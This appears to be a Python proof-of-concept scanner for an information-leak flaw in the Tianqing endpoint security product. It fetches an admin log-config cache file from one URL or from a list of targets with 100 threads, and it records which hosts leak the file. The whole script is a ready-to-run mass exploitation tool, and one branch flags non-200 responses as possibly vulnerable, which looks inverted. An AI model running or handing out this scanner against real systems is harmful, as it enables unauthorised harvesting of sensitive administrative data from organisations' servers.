import sys,requests, argparse,re
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()
def banner ():
    test = """                                                      
  /$$$$$$   /$$$$$$   /$$$$$$            /$$                       /$$     /$$                    
 /$$__  $$ /$$__  $$ /$$$_  $$          |__/                      | $$    |__/                    
|__/  \ $$| $$  \__/| $$$$\ $$  /$$$$$$  /$$ /$$$$$$$   /$$$$$$  /$$$$$$   /$$  /$$$$$$  /$$$$$$$ 
   /$$$$$/| $$$$$$$ | $$ $$ $$ /$$__  $$| $$| $$__  $$ /$$__  $$|_  $$_/  | $$ |____  $$| $$__  $$
  |___  $$| $$__  $$| $$\ $$$$| $$  \ $$| $$| $$  \ $$| $$  \ $$  | $$    | $$  /$$$$$$$| $$  \ $$
 /$$  \ $$| $$  \ $$| $$ \ $$$| $$  | $$| $$| $$  | $$| $$  | $$  | $$ /$$| $$ /$$__  $$| $$  | $$
|  $$$$$$/|  $$$$$$/|  $$$$$$/|  $$$$$$$| $$| $$  | $$|  $$$$$$$  |  $$$$/| $$|  $$$$$$$| $$  | $$
 \______/  \______/  \______/  \____  $$|__/|__/  |__/ \____  $$   \___/  |__/ \_______/|__/  |__/
                                    | $$               /$$  \ $$                                  
                                    | $$              |  $$$$$$/                                  
                                    |__/               \______/                                   
       
                                                 
     """
    print(test)
def main():
    banner()
    parser = argparse.ArgumentParser(description="天擎敏感信息泄露的脚本")
    parser.add_argument("-u", "--url", dest="url", type=str, help="Please enter url")
    parser.add_argument("-f", "--file", dest="file", type=str, help="Please enter file")
    args = parser.parse_args()
    if args.url and not args.file:
        poc(args.url)
    elif args.file and not args.url:
        url_list = []
        with open(args.file, 'r', encoding='utf-8') as f:
            for url in f.readlines():
                url_list.append(url.strip().replace('\n',''))
        mp = Pool(100)
        mp.map(poc, url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usag:\n\t python3 {sys.argv[0]} -h")
def poc(target):
    payload = '/runtime/admin_log_conf.cache'
    headers = {
        'User-Agent':'Mozilla/5.0(WindowsNT 10.0;Win64;x64;rv:128.0) Gecko/20100101 Firefox/128.0)'
    }
    try:
        res1 = requests.get(url=target+payload,timeout=6, headers=headers, verify=False)
        content = re.findall(r's:12:"(.*?)";',res1.text, re.S)
        if '/login/login' in content:
            with open('result.txt','a',encoding='utf-8') as f:
                f.write(target+'\n')
        elif res1.status_code != 200:
            print(f"[+]该{target}可能存在问题请手动测试")
        else:
            print(f"[-]{target}不存在漏洞")
    except Exception as e:
        print(e)
if __name__ == '__main__':
    main()